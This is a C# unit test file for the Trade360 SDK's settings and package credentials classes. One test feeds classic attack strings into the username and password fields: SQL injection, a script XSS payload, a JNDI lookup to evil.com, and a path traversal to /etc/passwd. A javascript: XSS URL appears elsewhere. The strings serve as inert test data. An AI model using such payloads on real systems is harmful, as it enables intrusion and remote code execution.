using System;
using FluentAssertions;
using Trade360SDK.Common.Configuration;
using Xunit;

namespace Trade360SDK.Common.Entities.Tests.Configuration
{
    /// <summary>
    /// Comprehensive unit tests for Trade360Settings and PackageCredentials configuration classes
    /// covering all properties, edge cases, validation scenarios, and proper behavior.
    /// </summary>
    public class SnapshotApiSettingsComprehensiveTests
    {
        #region Trade360Settings Tests

        [Fact]
        public void Trade360Settings_DefaultConstructor_ShouldInitializeWithNullValues()
        {
            // Act
            var settings = new Trade360Settings();

            // Assert
            settings.CustomersApiBaseUrl.Should().BeNull();
            settings.SnapshotApiBaseUrl.Should().BeNull();
            settings.InplayPackageCredentials.Should().BeNull();
            settings.PrematchPackageCredentials.Should().BeNull();
        }

        [Fact]
        public void Trade360Settings_CustomersApiBaseUrl_ShouldAcceptValidUrl()
        {
            // Arrange
            var settings = new Trade360Settings();
            var validUrl = "https://api.example.com";

            // Act
            settings.CustomersApiBaseUrl = validUrl;

            // Assert
            settings.CustomersApiBaseUrl.Should().Be(validUrl);
        }

        [Fact]
        public void Trade360Settings_SnapshotApiBaseUrl_ShouldAcceptValidUrl()
        {
            // Arrange
            var settings = new Trade360Settings();
            var validUrl = "https://snapshot.example.com";

            // Act
            settings.SnapshotApiBaseUrl = validUrl;

            // Assert
            settings.SnapshotApiBaseUrl.Should().Be(validUrl);
        }

        [Theory]
        [InlineData(null)]
        [InlineData("")]
        [InlineData("   ")]
        [InlineData("\t")]
        [InlineData("\n")]
        public void Trade360Settings_CustomersApiBaseUrl_ShouldAcceptNullOrWhitespace(string? url)
        {
            // Arrange
            var settings = new Trade360Settings();

            // Act
            settings.CustomersApiBaseUrl = url;

            // Assert
            settings.CustomersApiBaseUrl.Should().Be(url);
        }

        [Theory]
        [InlineData(null)]
        [InlineData("")]
        [InlineData("   ")]
        [InlineData("\t")]
        [InlineData("\n")]
        public void Trade360Settings_SnapshotApiBaseUrl_ShouldAcceptNullOrWhitespace(string? url)
        {
            // Arrange
            var settings = new Trade360Settings();

            // Act
            settings.SnapshotApiBaseUrl = url;

            // Assert
            settings.SnapshotApiBaseUrl.Should().Be(url);
        }

        [Theory]
        [InlineData("http://example.com")]
        [InlineData("https://example.com")]
        [InlineData("https://api.example.com/v1")]
        [InlineData("https://subdomain.example.com:8080/path")]
        [InlineData("http://localhost:5000")]
        [InlineData("https://127.0.0.1:8443")]
        public void Trade360Settings_ApiUrls_ShouldAcceptVariousValidUrlFormats(string url)
        {
            // Arrange
            var settings = new Trade360Settings();

            // Act
            settings.CustomersApiBaseUrl = url;
            settings.SnapshotApiBaseUrl = url;

            // Assert
            settings.CustomersApiBaseUrl.Should().Be(url);
            settings.SnapshotApiBaseUrl.Should().Be(url);
        }

        [Theory]
        [InlineData("not-a-url")]
        [InlineData("ftp://example.com")]
        [InlineData("javascript:alert('xss')")]
        [InlineData("data:text/plain,hello")]
        public void Trade360Settings_ApiUrls_ShouldAcceptInvalidUrlsWithoutValidation(string invalidUrl)
        {
            // Arrange
            var settings = new Trade360Settings();

            // Act & Assert - Should not throw, as the class doesn't validate URLs
            var act = () =>
            {
                settings.CustomersApiBaseUrl = invalidUrl;
                settings.SnapshotApiBaseUrl = invalidUrl;
            };

            act.Should().NotThrow();
            settings.CustomersApiBaseUrl.Should().Be(invalidUrl);
            settings.SnapshotApiBaseUrl.Should().Be(invalidUrl);
        }

        [Fact]
        public void Trade360Settings_InplayPackageCredentials_ShouldAcceptValidCredentials()
        {
            // Arrange
            var settings = new Trade360Settings();
            var credentials = new PackageCredentials
            {
                PackageId = 123,
                Username = "testuser",
                Password = "testpass"
            };

            // Act
            settings.InplayPackageCredentials = credentials;

            // Assert
            settings.InplayPackageCredentials.Should().BeSameAs(credentials);
            settings.InplayPackageCredentials.PackageId.Should().Be(123);
            settings.InplayPackageCredentials.Username.Should().Be("testuser");
            settings.InplayPackageCredentials.Password.Should().Be("testpass");
        }

        [Fact]
        public void Trade360Settings_PrematchPackageCredentials_ShouldAcceptValidCredentials()
        {
            // Arrange
            var settings = new Trade360Settings();
            var credentials = new PackageCredentials
            {
                PackageId = 456,
                Username = "prematchuser",
                Password = "prematchpass"
            };

            // Act
            settings.PrematchPackageCredentials = credentials;

            // Assert
            settings.PrematchPackageCredentials.Should().BeSameAs(credentials);
            settings.PrematchPackageCredentials.PackageId.Should().Be(456);
            settings.PrematchPackageCredentials.Username.Should().Be("prematchuser");
            settings.PrematchPackageCredentials.Password.Should().Be("prematchpass");
        }

        [Fact]
        public void Trade360Settings_BothCredentials_ShouldBeIndependent()
        {
            // Arrange
            var settings = new Trade360Settings();
            var inplayCredentials = new PackageCredentials { PackageId = 123, Username = "inplay" };
            var prematchCredentials = new PackageCredentials { PackageId = 456, Username = "prematch" };

            // Act
            settings.InplayPackageCredentials = inplayCredentials;
            settings.PrematchPackageCredentials = prematchCredentials;

            // Assert
            settings.InplayPackageCredentials.Should().BeSameAs(inplayCredentials);
            settings.PrematchPackageCredentials.Should().BeSameAs(prematchCredentials);
            settings.InplayPackageCredentials.Should().NotBeSameAs(prematchCredentials);
        }

        [Fact]
        public void Trade360Settings_AllProperties_ShouldBeSettableToNull()
        {
            // Arrange
            var settings = new Trade360Settings
            {
                CustomersApiBaseUrl = "https://example.com",
                SnapshotApiBaseUrl = "https://snapshot.com",
                InplayPackageCredentials = new PackageCredentials(),
                PrematchPackageCredentials = new PackageCredentials()
            };

            // Act
            settings.CustomersApiBaseUrl = null;
            settings.SnapshotApiBaseUrl = null;
            settings.InplayPackageCredentials = null;
            settings.PrematchPackageCredentials = null;

            // Assert
            settings.CustomersApiBaseUrl.Should().BeNull();
            settings.SnapshotApiBaseUrl.Should().BeNull();
            settings.InplayPackageCredentials.Should().BeNull();
            settings.PrematchPackageCredentials.Should().BeNull();
        }

        [Fact]
        public void Trade360Settings_PropertyAssignments_ShouldBeChainable()
        {
            // Arrange & Act
            var settings = new Trade360Settings
            {
                CustomersApiBaseUrl = "https://customers.example.com",
                SnapshotApiBaseUrl = "https://snapshot.example.com",
                InplayPackageCredentials = new PackageCredentials { PackageId = 1 },
                PrematchPackageCredentials = new PackageCredentials { PackageId = 2 }
            };

            // Assert
            settings.CustomersApiBaseUrl.Should().Be("https://customers.example.com");
            settings.SnapshotApiBaseUrl.Should().Be("https://snapshot.example.com");
            settings.InplayPackageCredentials.PackageId.Should().Be(1);
            settings.PrematchPackageCredentials.PackageId.Should().Be(2);
        }

        #endregion

        #region PackageCredentials Tests

        [Fact]
        public void PackageCredentials_DefaultConstructor_ShouldInitializeWithDefaults()
        {
            // Act
            var credentials = new PackageCredentials();

            // Assert
            credentials.PackageId.Should().Be(0); // Default int value
            credentials.Username.Should().BeNull();
            credentials.Password.Should().BeNull();
            credentials.MessageFormat.Should().Be("json"); // Default value
        }

        [Fact]
        public void PackageCredentials_PackageId_ShouldAcceptPositiveIntegers()
        {
            // Arrange
            var credentials = new PackageCredentials();

            // Act
            credentials.PackageId = 123;

            // Assert
            credentials.PackageId.Should().Be(123);
        }

        [Theory]
        [InlineData(0)]
        [InlineData(-1)]
        [InlineData(-100)]
        [InlineData(int.MinValue)]
        public void PackageCredentials_PackageId_ShouldAcceptZeroAndNegativeValues(int packageId)
        {
            // Arrange
            var credentials = new PackageCredentials();

            // Act
            credentials.PackageId = packageId;

            // Assert
            credentials.PackageId.Should().Be(packageId);
        }

        [Theory]
        [InlineData(1)]
        [InlineData(999)]
        [InlineData(12345)]
        [InlineData(int.MaxValue)]
        public void PackageCredentials_PackageId_ShouldAcceptLargeValues(int packageId)
        {
            // Arrange
            var credentials = new PackageCredentials();

            // Act
            credentials.PackageId = packageId;

            // Assert
            credentials.PackageId.Should().Be(packageId);
        }

        [Theory]
        [InlineData("validuser")]
        [InlineData("user123")]
        [InlineData("user_with_underscores")]
        [InlineData("user-with-dashes")]
        [InlineData("user.with.dots")]
        [InlineData("user@domain.com")]
        public void PackageCredentials_Username_ShouldAcceptValidUsernames(string username)
        {
            // Arrange
            var credentials = new PackageCredentials();

            // Act
            credentials.Username = username;

            // Assert
            credentials.Username.Should().Be(username);
        }

        [Theory]
        [InlineData(null)]
        [InlineData("")]
        [InlineData("   ")]
        [InlineData("\t")]
        [InlineData("\n")]
        public void PackageCredentials_Username_ShouldAcceptNullOrWhitespace(string? username)
        {
            // Arrange
            var credentials = new PackageCredentials();

            // Act
            credentials.Username = username;

            // Assert
            credentials.Username.Should().Be(username);
        }

        [Theory]
        [InlineData("simplepass")]
        [InlineData("Complex!Password123")]
        [InlineData("password_with_special_chars!@#$%^&*()")]
        [InlineData("very_long_password_that_exceeds_normal_length_expectations_but_should_still_work")]
        [InlineData("pass with spaces")]
        [InlineData("пароль")]  // Unicode password
        [InlineData("密码")]    // Chinese characters
        public void PackageCredentials_Password_ShouldAcceptVariousPasswordFormats(string password)
        {
            // Arrange
            var credentials = new PackageCredentials();

            // Act
            credentials.Password = password;

            // Assert
            credentials.Password.Should().Be(password);
        }

        [Theory]
        [InlineData(null)]
        [InlineData("")]
        [InlineData("   ")]
        [InlineData("\t")]
        [InlineData("\n")]
        public void PackageCredentials_Password_ShouldAcceptNullOrWhitespace(string? password)
        {
            // Arrange
            var credentials = new PackageCredentials();

            // Act
            credentials.Password = password;

            // Assert
            credentials.Password.Should().Be(password);
        }

        [Theory]
        [InlineData("json")]
        [InlineData("xml")]
        [InlineData("text")]
        [InlineData("binary")]
        [InlineData("custom")]
        public void PackageCredentials_MessageFormat_ShouldAcceptVariousFormats(string format)
        {
            // Arrange
            var credentials = new PackageCredentials();

            // Act
            credentials.MessageFormat = format;

            // Assert
            credentials.MessageFormat.Should().Be(format);
        }

        [Fact]
        public void PackageCredentials_MessageFormat_ShouldHaveDefaultValue()
        {
            // Act
            var credentials = new PackageCredentials();

            // Assert
            credentials.MessageFormat.Should().Be("json");
        }

        [Theory]
        [InlineData("")]
        [InlineData("   ")]
        [InlineData("\t")]
        [InlineData("\n")]
        public void PackageCredentials_MessageFormat_ShouldAcceptWhitespace(string format)
        {
            // Arrange
            var credentials = new PackageCredentials();

            // Act
            credentials.MessageFormat = format;

            // Assert
            credentials.MessageFormat.Should().Be(format);
        }

        [Fact]
        public void PackageCredentials_AllProperties_ShouldBeIndependent()
        {
            // Arrange
            var credentials = new PackageCredentials();

            // Act
            credentials.PackageId = 123;
            credentials.Username = "testuser";
            credentials.Password = "testpass";
            credentials.MessageFormat = "xml";

            // Assert
            credentials.PackageId.Should().Be(123);
            credentials.Username.Should().Be("testuser");
            credentials.Password.Should().Be("testpass");
            credentials.MessageFormat.Should().Be("xml");
        }

        [Fact]
        public void PackageCredentials_PropertyAssignments_ShouldBeChainable()
        {
            // Arrange & Act
            var credentials = new PackageCredentials
            {
                PackageId = 456,
                Username = "chainuser",
                Password = "chainpass",
                MessageFormat = "json"
            };

            // Assert
            credentials.PackageId.Should().Be(456);
            credentials.Username.Should().Be("chainuser");
            credentials.Password.Should().Be("chainpass");
            credentials.MessageFormat.Should().Be("json");
        }

        [Fact]
        public void PackageCredentials_ReassignProperties_ShouldUpdateValues()
        {
            // Arrange
            var credentials = new PackageCredentials
            {
                PackageId = 100,
                Username = "olduser",
                Password = "oldpass",
                MessageFormat = "xml"
            };

            // Act
            credentials.PackageId = 200;
            credentials.Username = "newuser";
            credentials.Password = "newpass";
            credentials.MessageFormat = "json";

            // Assert
            credentials.PackageId.Should().Be(200);
            credentials.Username.Should().Be("newuser");
            credentials.Password.Should().Be("newpass");
            credentials.MessageFormat.Should().Be("json");
        }

        #endregion

        #region Integration Tests

        [Fact]
        public void Trade360Settings_WithCompleteConfiguration_ShouldWorkCorrectly()
        {
            // Arrange & Act
            var settings = new Trade360Settings
            {
                CustomersApiBaseUrl = "https://customers.trade360.com",
                SnapshotApiBaseUrl = "https://snapshot.trade360.com",
                InplayPackageCredentials = new PackageCredentials
                {
                    PackageId = 12345,
                    Username = "inplay_user",
                    Password = "inplay_secure_password",
                    MessageFormat = "json"
                },
                PrematchPackageCredentials = new PackageCredentials
                {
                    PackageId = 67890,
                    Username = "prematch_user",
                    Password = "prematch_secure_password",
                    MessageFormat = "xml"
                }
            };

            // Assert
            settings.CustomersApiBaseUrl.Should().Be("https://customers.trade360.com");
            settings.SnapshotApiBaseUrl.Should().Be("https://snapshot.trade360.com");
            
            settings.InplayPackageCredentials.Should().NotBeNull();
            settings.InplayPackageCredentials!.PackageId.Should().Be(12345);
            settings.InplayPackageCredentials.Username.Should().Be("inplay_user");
            settings.InplayPackageCredentials.Password.Should().Be("inplay_secure_password");
            settings.InplayPackageCredentials.MessageFormat.Should().Be("json");
            
            settings.PrematchPackageCredentials.Should().NotBeNull();
            settings.PrematchPackageCredentials!.PackageId.Should().Be(67890);
            settings.PrematchPackageCredentials.Username.Should().Be("prematch_user");
            settings.PrematchPackageCredentials.Password.Should().Be("prematch_secure_password");
            settings.PrematchPackageCredentials.MessageFormat.Should().Be("xml");
        }

        [Fact]
        public void PackageCredentials_MultipleInstances_ShouldBeIndependent()
        {
            // Arrange & Act
            var credentials1 = new PackageCredentials
            {
                PackageId = 111,
                Username = "user1",
                Password = "pass1",
                MessageFormat = "json"
            };

            var credentials2 = new PackageCredentials
            {
                PackageId = 222,
                Username = "user2",
                Password = "pass2",
                MessageFormat = "xml"
            };

            // Assert
            credentials1.PackageId.Should().Be(111);
            credentials1.Username.Should().Be("user1");
            credentials1.Password.Should().Be("pass1");
            credentials1.MessageFormat.Should().Be("json");

            credentials2.PackageId.Should().Be(222);
            credentials2.Username.Should().Be("user2");
            credentials2.Password.Should().Be("pass2");
            credentials2.MessageFormat.Should().Be("xml");

            // Verify independence
            credentials1.Should().NotBeSameAs(credentials2);
        }

        [Fact]
        public void Trade360Settings_SameCredentialsInstance_ShouldBeSharedReference()
        {
            // Arrange
            var sharedCredentials = new PackageCredentials
            {
                PackageId = 999,
                Username = "shared",
                Password = "shared_pass"
            };

            // Act
            var settings = new Trade360Settings
            {
                InplayPackageCredentials = sharedCredentials,
                PrematchPackageCredentials = sharedCredentials  // Same instance
            };

            // Assert
            settings.InplayPackageCredentials.Should().BeSameAs(sharedCredentials);
            settings.PrematchPackageCredentials.Should().BeSameAs(sharedCredentials);
            settings.InplayPackageCredentials.Should().BeSameAs(settings.PrematchPackageCredentials);

            // Modifying one should affect both references
            sharedCredentials.PackageId = 1000;
            settings.InplayPackageCredentials!.PackageId.Should().Be(1000);
            settings.PrematchPackageCredentials!.PackageId.Should().Be(1000);
        }

        #endregion

        #region Edge Cases and Security Tests

        [Fact]
        public void PackageCredentials_ExtremelyLongStrings_ShouldBeHandled()
        {
            // Arrange
            var longString = new string('a', 10000); // 10k characters
            var credentials = new PackageCredentials();

            // Act
            credentials.Username = longString;
            credentials.Password = longString;
            credentials.MessageFormat = longString;

            // Assert
            credentials.Username.Should().Be(longString);
            credentials.Password.Should().Be(longString);
            credentials.MessageFormat.Should().Be(longString);
        }

        [Fact]
        public void Trade360Settings_ExtremelyLongUrls_ShouldBeHandled()
        {
            // Arrange
            var longUrl = "https://example.com/" + new string('a', 5000);
            var settings = new Trade360Settings();

            // Act
            settings.CustomersApiBaseUrl = longUrl;
            settings.SnapshotApiBaseUrl = longUrl;

            // Assert
            settings.CustomersApiBaseUrl.Should().Be(longUrl);
            settings.SnapshotApiBaseUrl.Should().Be(longUrl);
        }

        [Theory]
        [InlineData("admin'; DROP TABLE users; --")]
        [InlineData("<script>alert('xss')</script>")]
        [InlineData("${jndi:ldap://evil.com/exploit}")]
        [InlineData("../../etc/passwd")]
        public void PackageCredentials_MaliciousInput_ShouldBeStoredAsIs(string maliciousInput)
        {
            // Arrange
            var credentials = new PackageCredentials();

            // Act - Should not sanitize or validate, just store
            credentials.Username = maliciousInput;
            credentials.Password = maliciousInput;

            // Assert
            credentials.Username.Should().Be(maliciousInput);
            credentials.Password.Should().Be(maliciousInput);
        }

        #endregion
    }
} 